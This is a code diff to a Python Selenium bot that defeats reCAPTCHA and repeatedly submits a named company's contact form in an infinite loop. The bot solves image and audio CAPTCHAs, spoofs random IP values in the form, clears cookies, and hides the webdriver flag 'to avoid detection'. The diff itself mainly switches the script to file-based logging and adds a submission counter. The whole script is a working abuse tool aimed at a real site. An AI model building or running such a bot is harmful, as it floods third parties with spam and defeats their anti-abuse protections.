@@ -10,6 +10,7 @@ from scipy.io import wavfile
 
 import sys
 import logging
+import logging.config
 import random
 import os
 import urllib.request
@@ -27,19 +28,21 @@ AMP_THRESHOLD = 2500
 ATTACK_AUDIO = True
 ATTACK_IMAGES = False
 CHROMEDRIVER_PATH = "chromedriver.exe"
-LEVEL = logging.DEBUG
 
 parser = argparse.ArgumentParser()
 group = parser.add_mutually_exclusive_group()
 group.add_argument("--image", action='store_true', help="attack image recaptcha")
 group.add_argument("--audio", action='store_true', help="attack audio recaptcha")
 parser.add_argument("--driver", action="store", help="specify custom chromedriver path")
-parser.add_argument("--level", action="store", help="set log level", default="debug", choices=("debug", "warning"))
 
 args = parser.parse_args()
 ATTACK_IMAGES = args.image
 ATTACK_AUDIO = args.audio
 CHROMEDRIVER_PATH = args.driver
+
+logging.config.fileConfig('logging.conf')
+# create logger
+logger = logging.getLogger('file')
 
 if not ATTACK_AUDIO and not ATTACK_IMAGES:
     parser.print_help()
@@ -56,7 +59,7 @@ def init(task_type):
         TASK_NUM += 1
     if not os.path.isdir(TASK_DIR+str(TASK_NUM)):
         os.mkdir(TASK_DIR+str(TASK_NUM))
-        logging.info("Making "+ TASK_DIR+str(TASK_NUM))
+        logger.info("Making "+ TASK_DIR+str(TASK_NUM))
     TASK = "task"+str(TASK_NUM)
     TASK_PATH = os.path.join(task_type, TASK)
 
@@ -73,7 +76,7 @@ CLASSIFIER_PATH = "images\\classifier"
 def should_click_image(img, x, y, store, classifier):
     # ans = ris.parse_clarifai(ris.clarifai(img))
     ans = image.predict(os.path.abspath(img))
-    logging.debug(ans)
+    logger.debug(ans)
 
     if classifier.lower() == "chimneys":
         if "Roof" in ans:
@@ -101,7 +104,7 @@ def should_click_image(img, x, y, store, classifier):
 
 def store_in_dict(img, x, y, store, classifier):
     store[(x,y)] = True
-    logging.debug(store)
+    logger.debug(store)
 
     path = CLASSIFIER_PATH+"\\"+classifier.replace(' ', '_')
     os.makedirs(path, exist_ok=True)
@@ -126,7 +129,7 @@ def click_tiles(driver, coords):
         tile.click()
         wait_between(0.1, 0.5)
 
-    logging.debug("[*] Downloading new inbound image...")
+    logger.debug("[*] Downloading new inbound image...")
     new_files = {}
     for (x, y) in orig_srcs:
 
@@ -203,11 +206,11 @@ def image_recaptcha(driver, iframe):
             to_solve_queue[(x, y)] = f
             idx += 1
         
-        logging.debug(to_solve_queue)
+        logger.debug(to_solve_queue)
         
         coor_dict = {}
         handle_queue(to_solve_queue, coor_dict, target)  # multithread builds out where to click
-        logging.debug(coor_dict)
+        logger.debug(coor_dict)
         #os.system("rm "+TASK_PATH+"/full_payload.jpeg")
         
         driver.switch_to.default_content()  
@@ -355,12 +358,10 @@ def fill_out_profile(driver):
     random_ip = fake.ipv4_public()
     ip = driver.find_element(By.ID, "ip")
     driver.execute_script("arguments[0].value = '" + random_ip + "'", ip)
-    print(random_ip + "\n")
+    logger.debug("IP is: " + random_ip)
 
 ##############################  MAIN  ##############################
 def main():
-    logging.basicConfig(filename='angry-customer.log', filemode='w', level=LEVEL)
-
     chrome_options = webdriver.ChromeOptions()
     chrome_options.add_argument("--disable-bundled-ppapi-flash")
     #chrome_options.add_argument("--incognito")
@@ -374,27 +375,29 @@ def main():
 
     if CHROMEDRIVER_PATH:
         driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=chrome_options)
-        logging.debug("[*] Starting custom chromedriver %s" % CHROMEDRIVER_PATH)
+        logger.debug("Starting custom chromedriver %s" % CHROMEDRIVER_PATH)
     else:
         driver = webdriver.Chrome(chrome_options=chrome_options)
-        logging.debug("[*] Starting system default chromedriver")
+        logger.debug("Starting system default chromedriver")
 
-    driver.delete_all_cookies()
     agent = driver.execute_script("return navigator.userAgent")
-    logging.debug("[*] Cookies cleared")
-    logging.debug("[ ] Starting driver with user agent %s" % agent)
+    logger.debug("Starting driver with user agent %s" % agent)
 
     #Initiate attack in an infinite loop
+    submitted = 0
     while True:
 
-        logging.info("[*] Starting attack on Amass's recaptcha")
+        logger.info("Starting attack on Amass's recaptcha")
         driver.get("https://www.amass.ro/contact.html")
+
+        driver.delete_all_cookies()
+        logger.debug("Cookies cleared")
 
         #avoid detection of automated control
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false,})")
         wait_between(1, 4)
 
-        logging.debug("[*] Filling out Contact form")
+        logger.debug("Filling out Contact form")
         fill_out_profile(driver)
 
         #scroll to end of form
@@ -408,7 +411,7 @@ def main():
         driver.switch_to.frame(iframeSwitch)
         #ActionChains(driver).move_to_element(iframeSwitch).perform()
         driver.delete_all_cookies()
-        logging.info("[*] Recaptcha located. Engaging")
+        logger.info("Recaptcha located. Engaging")
         WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
         ele = driver.find_element(By.ID, "recaptcha-anchor")
         #ActionChains(driver).move_to_element(ele).perform()
@@ -445,7 +448,7 @@ def main():
                 driver.find_element(By.ID, "recaptcha-verify-button").click()
                 wait_between(1, 2.5)
                 try:
-                    logging.debug("Checking if Google wants us to solve more...")
+                    logger.debug("Checking if Google wants us to solve more...")
                     driver.switch_to.default_content()
                     driver.switch_to.frame(iframeSwitch)
                     checkmark_pos = driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark").get_attribute("style")
@@ -461,7 +464,11 @@ def main():
         driver.execute_script("arguments[0].scrollIntoView();", submit)
         wait_between(3, 5)
         submit.click()
-        wait_between(3, 5)
+
+        submitted += 1
+        logger.debug("--- Submitted " + str(submitted) + " times! ---")
+
+        wait_between(20, 25)
 
 main()
 # test_all()
